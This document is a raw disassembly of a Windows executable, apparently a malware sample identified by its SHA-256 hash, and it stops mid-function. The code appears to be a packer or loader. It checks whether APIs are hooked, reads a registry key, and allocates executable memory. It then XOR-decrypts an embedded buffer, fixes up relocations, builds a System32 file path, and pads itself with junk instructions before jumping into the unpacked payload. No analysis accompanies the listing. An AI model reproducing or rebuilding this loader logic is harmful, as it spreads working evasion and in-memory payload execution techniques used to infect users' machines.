
ff97849d2b618607605f24b47a2fb1812092fc7732378f0802ceff8d92282b30.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401020
  401008:	pop    ebp
  401009:	ret    
  40100a:	int3   
  40100b:	int3   
  40100c:	int3   
  40100d:	int3   
  40100e:	int3   
  40100f:	int3   
  401010:	push   ebp
  401011:	mov    ebp,esp
  401013:	mov    eax,DWORD PTR [ebp+0x8]
  401016:	mov    eax,DWORD PTR [eax-0x4]
  401019:	pop    ebp
  40101a:	ret    
  40101b:	int3   
  40101c:	int3   
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x401510
  401028:	mov    eax,ds:0x42ee98
  40102d:	push   eax
  40102e:	call   0x401010
  401033:	add    esp,0x4
  401036:	mov    ds:0x42ee9c,eax
  40103b:	mov    ecx,DWORD PTR ds:0x42ee9c
  401041:	push   ecx
  401042:	call   0x401990
  401047:	add    esp,0x4
  40104a:	mov    ds:0x42eea0,eax
  40104f:	pop    ebp
  401050:	ret    
  401051:	int3   
  401052:	int3   
  401053:	int3   
  401054:	int3   
  401055:	int3   
  401056:	int3   
  401057:	int3   
  401058:	int3   
  401059:	int3   
  40105a:	int3   
  40105b:	int3   
  40105c:	int3   
  40105d:	int3   
  40105e:	int3   
  40105f:	int3   
  401060:	push   ebp
  401061:	mov    ebp,esp
  401063:	sub    esp,0x14
  401066:	mov    eax,ds:0x42edbc
  40106b:	mov    DWORD PTR [ebp-0x10],eax
  40106e:	mov    DWORD PTR [ebp-0xc],0x425000
  401075:	mov    DWORD PTR [ebp-0x4],0x425064
  40107c:	mov    ecx,DWORD PTR [ebp-0x10]
  40107f:	movzx  edx,BYTE PTR [ecx]
  401082:	cmp    edx,0x55
  401085:	je     0x4010a4
  401087:	mov    eax,DWORD PTR [ebp-0x10]
  40108a:	movzx  ecx,BYTE PTR [eax]
  40108d:	cmp    ecx,0x8b
  401093:	je     0x4010a4
  401095:	mov    edx,DWORD PTR [ebp-0x10]
  401098:	movzx  eax,BYTE PTR [edx]
  40109b:	cmp    eax,0x6a
  40109e:	je     0x4010a4
  4010a0:	xor    eax,eax
  4010a2:	jmp    0x40110c
  4010a4:	mov    ecx,0x52
  4010a9:	mov    edx,DWORD PTR [ebp-0x4]
  4010ac:	mov    WORD PTR [edx],cx
  4010af:	mov    eax,0x65
  4010b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4010b7:	mov    WORD PTR [ecx+0x2],ax
  4010bb:	mov    edx,0x65
  4010c0:	mov    eax,DWORD PTR [ebp-0x4]
  4010c3:	mov    WORD PTR [eax+0xa],dx
  4010c7:	mov    ecx,0x6e
  4010cc:	mov    edx,DWORD PTR [ebp-0x4]
  4010cf:	mov    WORD PTR [edx+0xc],cx
  4010d3:	mov    eax,0x4b
  4010d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4010db:	mov    WORD PTR [ecx+0xe],ax
  4010df:	mov    edx,DWORD PTR ds:0x42edc4
  4010e5:	mov    DWORD PTR [ebp-0x8],edx
  4010e8:	lea    eax,[ebp-0x14]
  4010eb:	push   eax
  4010ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4010ef:	push   ecx
  4010f0:	push   0x80000002
  4010f5:	call   DWORD PTR [ebp-0x8]
  4010f8:	test   eax,eax
  4010fa:	jne    0x401105
  4010fc:	mov    eax,0x1
  401101:	jmp    0x40110c
  401103:	jmp    0x40110c
  401105:	call   0x401060
  40110a:	xor    eax,eax
  40110c:	mov    esp,ebp
  40110e:	pop    ebp
  40110f:	ret    
  401110:	push   ebp
  401111:	mov    ebp,esp
  401113:	sub    esp,0x220
  401119:	mov    DWORD PTR [ebp-0x210],0x0
  401123:	mov    DWORD PTR [ebp-0x20c],0x425070
  40112d:	mov    DWORD PTR [ebp-0x218],0x0
  401137:	jmp    0x401148
  401139:	mov    eax,DWORD PTR [ebp-0x218]
  40113f:	add    eax,0x4
  401142:	mov    DWORD PTR [ebp-0x218],eax
  401148:	mov    ecx,DWORD PTR [ebp-0x218]
  40114e:	cmp    ecx,DWORD PTR [ebp+0xc]
  401151:	jae    0x4011ae
  401153:	mov    edx,DWORD PTR [ebp-0x218]
  401159:	add    edx,0x5b3e
  40115f:	mov    DWORD PTR ds:0x42eea4,edx
  401165:	mov    eax,DWORD PTR [ebp+0x8]
  401168:	add    eax,DWORD PTR [ebp-0x218]
  40116e:	mov    DWORD PTR [ebp-0x220],eax
  401174:	mov    ecx,DWORD PTR [ebp-0x220]
  40117a:	mov    edx,DWORD PTR [ecx]
  40117c:	add    edx,DWORD PTR [ebp-0x218]
  401182:	mov    eax,DWORD PTR [ebp-0x220]
  401188:	mov    DWORD PTR [eax],edx
  40118a:	mov    ecx,DWORD PTR [ebp-0x220]
  401190:	mov    DWORD PTR [ebp-0x21c],ecx
  401196:	mov    edx,DWORD PTR [ebp-0x21c]
  40119c:	mov    eax,DWORD PTR [edx]
  40119e:	xor    eax,DWORD PTR ds:0x42eea4
  4011a4:	mov    ecx,DWORD PTR [ebp-0x21c]
  4011aa:	mov    DWORD PTR [ecx],eax
  4011ac:	jmp    0x401139
  4011ae:	mov    esp,ebp
  4011b0:	pop    ebp
  4011b1:	ret    
  4011b2:	int3   
  4011b3:	int3   
  4011b4:	int3   
  4011b5:	int3   
  4011b6:	int3   
  4011b7:	int3   
  4011b8:	int3   
  4011b9:	int3   
  4011ba:	int3   
  4011bb:	int3   
  4011bc:	int3   
  4011bd:	int3   
  4011be:	int3   
  4011bf:	int3   
  4011c0:	push   ebp
  4011c1:	mov    ebp,esp
  4011c3:	sub    esp,0x2cc
  4011c9:	push   ebx
  4011ca:	push   esi
  4011cb:	push   edi
  4011cc:	mov    DWORD PTR [ebp-0x290],0x401a20
  4011d6:	mov    DWORD PTR ds:0x42eea8,ebp
  4011dc:	pusha  
  4011dd:	mov    DWORD PTR [ebp-0x294],0x0
  4011e7:	mov    DWORD PTR [ebp-0x2a4],0x80000002
  4011f1:	call   0x401060
  4011f6:	test   eax,eax
  4011f8:	je     0x401232
  4011fa:	call   0x4014e0
  4011ff:	mov    eax,ds:0x42ee98
  401204:	push   eax
  401205:	call   0x401010
  40120a:	add    esp,0x4
  40120d:	mov    ds:0x42ee9c,eax
  401212:	mov    ecx,DWORD PTR ds:0x42ee9c
  401218:	push   ecx
  401219:	call   0x401990
  40121e:	add    esp,0x4
  401221:	mov    ds:0x42eeac,eax
  401226:	mov    edx,DWORD PTR ds:0x42ee9c
  40122c:	mov    DWORD PTR [ebp-0x29c],edx
  401232:	mov    DWORD PTR [ebp-0x288],0x64
  40123c:	mov    DWORD PTR [ebp-0x224],0x2a
  401246:	mov    DWORD PTR [ebp-0x294],0x0
  401250:	mov    DWORD PTR [ebp-0x258],0x0
  40125a:	mov    DWORD PTR [ebp-0x284],0x1
  401264:	mov    DWORD PTR [ebp-0x21c],0x0
  40126e:	mov    eax,DWORD PTR [ebp-0x294]
  401274:	cmp    eax,DWORD PTR ds:0x42ee9c
  40127a:	jae    0x40130b
  401280:	mov    ecx,DWORD PTR [ebp-0x29c]
  401286:	push   ecx
  401287:	mov    edx,DWORD PTR [ebp-0x288]
  40128d:	push   edx
  40128e:	call   0x401ac0
  401293:	add    esp,0x8
  401296:	mov    DWORD PTR [ebp-0x2a0],eax
  40129c:	call   0x401b90
  4012a1:	mov    eax,DWORD PTR [ebp-0x2a0]
  4012a7:	push   eax
  4012a8:	mov    ecx,DWORD PTR ds:0x42ee98
  4012ae:	add    ecx,DWORD PTR [ebp-0x258]
  4012b4:	push   ecx
  4012b5:	mov    edx,DWORD PTR ds:0x42eeac
  4012bb:	add    edx,DWORD PTR [ebp-0x294]
  4012c1:	push   edx
  4012c2:	call   0x401800
  4012c7:	add    esp,0xc
  4012ca:	mov    eax,DWORD PTR [ebp-0x224]
  4012d0:	add    eax,DWORD PTR [ebp-0x288]
  4012d6:	add    eax,DWORD PTR [ebp-0x258]
  4012dc:	mov    DWORD PTR [ebp-0x258],eax
  4012e2:	mov    ecx,DWORD PTR [ebp-0x294]
  4012e8:	add    ecx,DWORD PTR [ebp-0x288]
  4012ee:	mov    DWORD PTR [ebp-0x294],ecx
  4012f4:	mov    edx,DWORD PTR [ebp-0x29c]
  4012fa:	sub    edx,DWORD PTR [ebp-0x2a0]
  401300:	mov    DWORD PTR [ebp-0x29c],edx
  401306:	jmp    0x40126e
  40130b:	mov    eax,ds:0x42ee9c
  401310:	push   eax
  401311:	mov    ecx,DWORD PTR ds:0x42eeac
  401317:	push   ecx
  401318:	call   0x401110
  40131d:	add    esp,0x8
  401320:	mov    DWORD PTR [ebp-0x258],0x0
  40132a:	mov    DWORD PTR [ebp-0x2c0],0x0
  401334:	mov    edx,DWORD PTR ds:0x42ee9c
  40133a:	push   edx
  40133b:	push   0x0
  40133d:	mov    eax,ds:0x42eea0
  401342:	push   eax
  401343:	call   0x401000
  401348:	add    esp,0xc
  40134b:	mov    ecx,DWORD PTR ds:0x42ee9c
  401351:	mov    DWORD PTR [ebp-0x2c8],ecx
  401357:	mov    edx,DWORD PTR [ebp-0x2c0]
  40135d:	cmp    edx,DWORD PTR ds:0x42ee9c
  401363:	jae    0x4013ee
  401369:	mov    eax,DWORD PTR [ebp-0x2c8]
  40136f:	push   eax
  401370:	mov    ecx,DWORD PTR [ebp-0x288]
  401376:	push   ecx
  401377:	call   0x401ac0
  40137c:	add    esp,0x8
  40137f:	mov    DWORD PTR [ebp-0x2cc],eax
  401385:	mov    edx,DWORD PTR [ebp-0x2cc]
  40138b:	push   edx
  40138c:	mov    eax,ds:0x42ee98
  401391:	add    eax,DWORD PTR [ebp-0x258]
  401397:	push   eax
  401398:	mov    ecx,DWORD PTR ds:0x42eea0
  40139e:	add    ecx,DWORD PTR [ebp-0x2c0]
  4013a4:	push   ecx
  4013a5:	call   0x401800
  4013aa:	add    esp,0xc
  4013ad:	mov    edx,DWORD PTR [ebp-0x224]
  4013b3:	add    edx,DWORD PTR [ebp-0x288]
  4013b9:	add    edx,DWORD PTR [ebp-0x258]
  4013bf:	mov    DWORD PTR [ebp-0x258],edx
  4013c5:	mov    eax,DWORD PTR [ebp-0x2c0]
  4013cb:	add    eax,DWORD PTR [ebp-0x288]
  4013d1:	mov    DWORD PTR [ebp-0x2c0],eax
  4013d7:	mov    ecx,DWORD PTR [ebp-0x2c8]
  4013dd:	sub    ecx,DWORD PTR [ebp-0x2cc]
  4013e3:	mov    DWORD PTR [ebp-0x2c8],ecx
  4013e9:	jmp    0x401357
  4013ee:	mov    edx,DWORD PTR ds:0x42ee9c
  4013f4:	push   edx
  4013f5:	mov    eax,ds:0x42eea0
  4013fa:	push   eax
  4013fb:	call   0x401110
  401400:	add    esp,0x8
  401403:	mov    DWORD PTR [ebp-0x290],0x401a20
  40140d:	mov    ecx,DWORD PTR ds:0x42eeac
  401413:	mov    edx,DWORD PTR ds:0x42eea0
  401419:	mov    DWORD PTR [ecx],edx
  40141b:	push   0x19000
  401420:	call   0x401990
  401425:	add    esp,0x4
  401428:	mov    ds:0x42eeb0,eax
  40142d:	mov    eax,ds:0x42eeb0
  401432:	add    eax,0x200
  401437:	mov    ds:0x42eeb4,eax
  40143c:	push   0x17700
  401441:	mov    ecx,DWORD PTR ds:0x42eeac
  401447:	push   ecx
  401448:	mov    edx,DWORD PTR ds:0x42eeb4
  40144e:	push   edx
  40144f:	call   0x401800
  401454:	add    esp,0xc
  401457:	mov    eax,ds:0x42eeb0
  40145c:	add    eax,0x17590
  401461:	mov    ds:0x42eeb8,eax
  401466:	popa   
  401467:	mov    ecx,ecx
  401469:	push   0x37
  40146b:	mov    eax,DWORD PTR [ebp-0x290]
  401471:	mov    ecx,esp
  401473:	sub    ecx,0x22
  401476:	mov    edx,0x1e
  40147b:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  40147f:	ret    
  401480:	xor    eax,eax
  401482:	pop    edi
  401483:	pop    esi
  401484:	pop    ebx
  401485:	mov    esp,ebp
  401487:	pop    ebp
  401488:	ret    
  401489:	int3   
  40148a:	int3   
  40148b:	int3   
  40148c:	int3   
  40148d:	int3   
  40148e:	int3   
  40148f:	int3   
  401490:	push   ebp
  401491:	mov    ebp,esp
  401493:	call   0x4011c0
  401498:	pop    ebp
  401499:	ret    
  40149a:	int3   
  40149b:	int3   
  40149c:	int3   
  40149d:	int3   
  40149e:	int3   
  40149f:	int3   
  4014a0:	push   ebp
  4014a1:	mov    ebp,esp
  4014a3:	mov    eax,ds:0x42eebc
  4014a8:	sub    eax,0x8
  4014ab:	shr    eax,1
  4014ad:	mov    ds:0x42eebc,eax
  4014b2:	pop    ebp
  4014b3:	ret    
  4014b4:	int3   
  4014b5:	int3   
  4014b6:	int3   
  4014b7:	int3   
  4014b8:	int3   
  4014b9:	int3   
  4014ba:	int3   
  4014bb:	int3   
  4014bc:	int3   
  4014bd:	int3   
  4014be:	int3   
  4014bf:	int3   
  4014c0:	push   ebp
  4014c1:	mov    ebp,esp
  4014c3:	pop    ebp
  4014c4:	ret    0x10
  4014c7:	int3   
  4014c8:	int3   
  4014c9:	int3   
  4014ca:	int3   
  4014cb:	int3   
  4014cc:	int3   
  4014cd:	int3   
  4014ce:	int3   
  4014cf:	int3   
  4014d0:	push   ebp
  4014d1:	mov    ebp,esp
  4014d3:	pop    ebp
  4014d4:	ret    0x10
  4014d7:	int3   
  4014d8:	int3   
  4014d9:	int3   
  4014da:	int3   
  4014db:	int3   
  4014dc:	int3   
  4014dd:	int3   
  4014de:	int3   
  4014df:	int3   
  4014e0:	push   ebp
  4014e1:	mov    ebp,esp
  4014e3:	sub    esp,0x10
  4014e6:	mov    DWORD PTR [ebp-0x10],0x40321a
  4014ed:	mov    DWORD PTR [ebp-0x4],0x4
  4014f4:	mov    eax,DWORD PTR [ebp-0x10]
  4014f7:	add    eax,DWORD PTR [ebp-0x4]
  4014fa:	mov    DWORD PTR [ebp-0xc],eax
  4014fd:	mov    ecx,DWORD PTR [ebp-0xc]
  401500:	mov    DWORD PTR [ebp-0x8],ecx
  401503:	mov    edx,DWORD PTR [ebp-0x8]
  401506:	mov    DWORD PTR ds:0x42ee98,edx
  40150c:	mov    esp,ebp
  40150e:	pop    ebp
  40150f:	ret    
  401510:	push   ebp
  401511:	mov    ebp,esp
  401513:	sub    esp,0x8
  401516:	mov    DWORD PTR [ebp-0x4],0x4
  40151d:	mov    eax,DWORD PTR [ebp-0x4]
  401520:	add    eax,0x402f44
  401525:	mov    ds:0x42ee98,eax
  40152a:	mov    ecx,DWORD PTR ds:0x42edc8
  401530:	mov    DWORD PTR [ebp-0x8],ecx
  401533:	mov    esp,ebp
  401535:	pop    ebp
  401536:	ret    
  401537:	int3   
  401538:	int3   
  401539:	int3   
  40153a:	int3   
  40153b:	int3   
  40153c:	int3   
  40153d:	int3   
  40153e:	int3   
  40153f:	int3   
  401540:	push   ebp
  401541:	mov    ebp,esp
  401543:	sub    esp,0x8
  401546:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40154d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401554:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40155b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401562:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401569:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401570:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401577:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40157e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401585:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40158c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401593:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40159a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015a1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015a8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015af:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015b6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015bd:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015c4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015cb:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015d9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015ee:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015f5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015fc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401603:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40160a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401611:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401618:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40161f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401626:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40162d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401634:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40163b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401642:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401649:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401650:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401657:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40165e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401665:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40166c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401673:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40167a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401681:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401688:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40168f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401696:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40169d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ab:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ce:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016d5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016dc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ea:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ff:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401706:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40170d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401714:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40171b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401722:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401729:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401730:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401737:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40173e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401745:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40174c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401753:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40175a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401761:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401768:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40176f:	mov    DWORD PTR [ebp-0x4],0x0
  401776:	jmp    0x401781
  401778:	mov    eax,DWORD PTR [ebp-0x4]
  40177b:	add    eax,0x1
  40177e:	mov    DWORD PTR [ebp-0x4],eax
  401781:	mov    ecx,DWORD PTR [ebp-0x4]
  401784:	cmp    ecx,DWORD PTR ds:0x42eebc
  40178a:	jae    0x4017ef
  40178c:	mov    edx,DWORD PTR [ebp-0x4]
  40178f:	push   edx
  401790:	mov    eax,ds:0x42eec0
  401795:	push   eax
  401796:	call   0x401a60
  40179b:	add    esp,0x8
  40179e:	sar    eax,0xc
  4017a1:	cmp    eax,0x3
  4017a4:	jne    0x4017ed
  4017a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4017a9:	push   ecx
  4017aa:	mov    edx,DWORD PTR ds:0x42eec0
  4017b0:	push   edx
  4017b1:	call   0x401a60
  4017b6:	add    esp,0x8
  4017b9:	and    eax,0xfff
  4017be:	add    eax,0x5d6fc8
  4017c3:	mov    DWORD PTR [ebp-0x8],eax
  4017c6:	mov    eax,DWORD PTR [ebp+0x8]
  4017c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4017cc:	add    ecx,DWORD PTR [eax]
  4017ce:	mov    edx,DWORD PTR [ebp-0x8]
  4017d1:	mov    eax,DWORD PTR [ecx+edx*1-0x5d6fc8]
  4017d8:	add    eax,DWORD PTR [ebp+0x10]
  4017db:	mov    ecx,DWORD PTR [ebp+0x8]
  4017de:	mov    edx,DWORD PTR [ebp+0xc]
  4017e1:	add    edx,DWORD PTR [ecx]
  4017e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4017e6:	mov    DWORD PTR [edx+ecx*1-0x5d6fc8],eax
  4017ed:	jmp    0x401778
  4017ef:	mov    esp,ebp
  4017f1:	pop    ebp
  4017f2:	ret    
  4017f3:	int3   
  4017f4:	int3   
  4017f5:	int3   
  4017f6:	int3   
  4017f7:	int3   
  4017f8:	int3   
  4017f9:	int3   
  4017fa:	int3   
  4017fb:	int3   
  4017fc:	int3   
  4017fd:	int3   
  4017fe:	int3   
  4017ff:	int3   
  401800:	push   ebp
  401801:	mov    ebp,esp
  401803:	sub    esp,0x214
  401809:	push   0x104
  40180e:	lea    eax,[ebp-0x208]
  401814:	push   eax
  401815:	call   DWORD PTR ds:0x42eec4
  40181b:	mov    DWORD PTR [ebp-0x210],0x0
  401825:	jmp    0x401836
  401827:	mov    ecx,DWORD PTR [ebp-0x210]
  40182d:	add    ecx,0x1
  401830:	mov    DWORD PTR [ebp-0x210],ecx
  401836:	mov    edx,DWORD PTR [ebp-0x210]
  40183c:	cmp    edx,DWORD PTR [ebp+0x10]
  40183f:	jge    0x401938
  401845:	cmp    DWORD PTR [ebp-0x210],0x0
  40184c:	jne    0x40191d
  401852:	mov    DWORD PTR [ebp-0x214],0x425094
  40185c:	mov    eax,0x5c
  401861:	mov    ecx,DWORD PTR [ebp-0x214]
  401867:	mov    WORD PTR [ecx],ax
  40186a:	mov    edx,0x65
  40186f:	mov    eax,DWORD PTR [ebp-0x214]
  401875:	mov    WORD PTR [eax+0xa],dx
  401879:	mov    ecx,0x6d
  40187e:	mov    edx,DWORD PTR [ebp-0x214]
  401884:	mov    WORD PTR [edx+0xc],cx
  401888:	mov    eax,0x33
  40188d:	mov    ecx,DWORD PTR [ebp-0x214]
  401893:	mov    WORD PTR [ecx+0xe],ax
  401897:	mov    edx,0x32
  40189c:	mov    eax,DWORD PTR [ebp-0x214]
  4018a2:	mov    WORD PTR [eax+0x10],dx
  4018a6:	mov    ecx,0x5c
  4018ab:	mov    edx,DWORD PTR [ebp-0x214]
  4018b1:	mov    WORD PTR [edx+0x12],cx
  4018b5:	mov    eax,0x73
  4018ba:	mov    ecx,DWORD PTR [ebp-0x214]
  4018c0:	mov    WORD PTR [ecx+0x16],ax
  4018c4:	mov    edx,0x65
  4018c9:	mov    eax,DWORD PTR [ebp-0x214]
  4018cf:	mov    WORD PTR [eax+0x24],dx
  4018d3:	mov    ecx,DWORD PTR [ebp-0x214]
  4018d9:	push   ecx
  4018da:	lea    edx,[ebp-0x208]
  4018e0:	push   edx
  4018e1:	call   DWORD PTR ds:0x42eec8
  4018e7:	push   0x0
  4018e9:	push   0x80
  4018ee:	push   0x3
  4018f0:	push   0x0
  4018f2:	push   0x3
  4018f4:	push   0x1
  4018f6:	lea    eax,[ebp-0x208]
  4018fc:	push   eax
  4018fd:	call   DWORD PTR ds:0x42eecc
  401903:	mov    DWORD PTR [ebp-0x20c],eax
  401909:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  401910:	je     0x40191b
  401912:	cmp    DWORD PTR [ebp-0x20c],0x0
  401919:	jne    0x40191d
  40191b:	jmp    0x401972
  40191d:	mov    ecx,DWORD PTR [ebp+0x8]
  401920:	add    ecx,DWORD PTR [ebp-0x210]
  401926:	mov    edx,DWORD PTR [ebp+0xc]
  401929:	add    edx,DWORD PTR [ebp-0x210]
  40192f:	mov    al,BYTE PTR [edx]
  401931:	mov    BYTE PTR [ecx],al
  401933:	jmp    0x401827
  401938:	mov    ecx,DWORD PTR [ebp+0x8]
  40193b:	cmp    ecx,DWORD PTR ds:0x42eeb4
  401941:	jne    0x401965
  401943:	mov    edx,DWORD PTR ds:0x42eeb0
  401949:	sub    edx,0x400000
  40194f:	push   edx
  401950:	mov    eax,ds:0x42eeb0
  401955:	push   eax
  401956:	mov    ecx,DWORD PTR ds:0x42eea0
  40195c:	push   ecx
  40195d:	call   0x401b00
  401962:	add    esp,0xc
  401965:	mov    edx,DWORD PTR [ebp-0x20c]
  40196b:	push   edx
  40196c:	call   DWORD PTR ds:0x42ed9c
  401972:	mov    esp,ebp
  401974:	pop    ebp
  401975:	ret    
  401976:	int3   
  401977:	int3   
  401978:	int3   
  401979:	int3   
  40197a:	int3   
  40197b:	int3   
  40197c:	int3   
  40197d:	int3   
  40197e:	int3   
  40197f:	int3   
  401980:	push   ebp
  401981:	mov    ebp,esp
  401983:	mov    eax,DWORD PTR [ebp+0x8]
  401986:	mov    ecx,DWORD PTR [ebp+0x8]
  401989:	add    ecx,DWORD PTR [eax+0x4]
  40198c:	mov    eax,ecx
  40198e:	pop    ebp
  40198f:	ret    
  401990:	push   ebp
  401991:	mov    ebp,esp
  401993:	sub    esp,0x220
  401999:	mov    DWORD PTR [ebp-0x8],0x215
  4019a0:	mov    DWORD PTR [ebp-0x220],0x3000
  4019aa:	mov    DWORD PTR [ebp-0x4],0x40
  4019b1:	mov    DWORD PTR [ebp-0x214],0x0
  4019bb:	mov    DWORD PTR [ebp-0x218],0x0
  4019c5:	mov    eax,ds:0x42eda0
  4019ca:	mov    ds:0x42eec4,eax
  4019cf:	push   0x104
  4019d4:	lea    ecx,[ebp-0x210]
  4019da:	push   ecx
  4019db:	call   DWORD PTR ds:0x42eec4
  4019e1:	mov    edx,DWORD PTR ds:0x42eda4
  4019e7:	mov    DWORD PTR ds:0x42eec8,edx
  4019ed:	mov    eax,ds:0x42eda8
  4019f2:	mov    ds:0x42eecc,eax
  4019f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4019fa:	push   ecx
  4019fb:	mov    edx,DWORD PTR [ebp-0x220]
  401a01:	push   edx
  401a02:	mov    eax,DWORD PTR [ebp+0x8]
  401a05:	push   eax
  401a06:	mov    ecx,DWORD PTR [ebp-0x214]
  401a0c:	push   ecx
  401a0d:	push   0xffffffff
  401a0f:	call   DWORD PTR ds:0x42edac
  401a15:	mov    esp,ebp
  401a17:	pop    ebp
  401a18:	ret    
  401a19:	int3   
  401a1a:	int3   
  401a1b:	int3   
  401a1c:	int3   
  401a1d:	int3   
  401a1e:	int3   
  401a1f:	int3   
  401a20:	push   ebp
  401a21:	mov    ebp,esp
  401a23:	push   ecx
  401a24:	mov    DWORD PTR [ebp-0x4],0x5e3d
  401a2b:	mov    ecx,ecx
  401a2d:	mov    ecx,ecx
  401a2f:	mov    ecx,ecx
  401a31:	mov    ecx,ecx
  401a33:	mov    edx,edx
  401a35:	mov    edx,edx
  401a37:	mov    edx,edx
  401a39:	mov    ecx,ecx
  401a3b:	mov    esp,DWORD PTR ds:0x42eea8
  401a41:	mov    ecx,ecx
  401a43:	mov    edx,edx
  401a45:	mov    ecx,ecx
  401a47:	mov    edx,edx
  401a49:	add    esp,0x4
  401a4c:	mov    edx,edx
  401a4e:	mov    ecx,ecx
  401a50:	mov    edx,edx
  401a52:	mov    edx,edx
  401a54:	jmp    DWORD PTR ds:0x42eeb8
  401a5a:	mov    esp,ebp
  401a5c:	pop    ebp
  401a5d:	ret    
  401a5e:	int3   
  401a5f:	int3   
  401a60:	push   ebp
  401a61:	mov    ebp,esp
  401a63:	sub    esp,0x18
  401a66:	mov    eax,DWORD PTR [ebp+0x8]
  401a69:	mov    DWORD PTR [ebp-0x8],eax
  401a6c:	mov    ecx,DWORD PTR [ebp+0xc]
  401a6f:	mov    DWORD PTR [ebp-0x4],ecx
  401a72:	mov    DWORD PTR [ebp-0x10],0x19c
  401a79:	mov    edx,DWORD PTR [ebp-0x8]
  401a7c:	mov    DWORD PTR ds:0x42eed0,edx
  401a82:	mov    eax,DWORD PTR [ebp-0x4]
  401a85:	mov    ds:0x42eed4,eax
  401a8a:	mov    ecx,DWORD PTR ds:0x42eed0
  401a90:	mov    DWORD PTR [ebp-0x14],ecx
  401a93:	mov    edx,DWORD PTR ds:0x42eed4
  401a99:	mov    DWORD PTR [ebp-0xc],edx
  401a9c:	mov    eax,DWORD PTR [ebp-0xc]
  401a9f:	mov    ecx,DWORD PTR [ebp-0x14]
  401aa2:	lea    edx,[ecx+eax*2]
  401aa5:	mov    DWORD PTR [ebp-0x18],edx
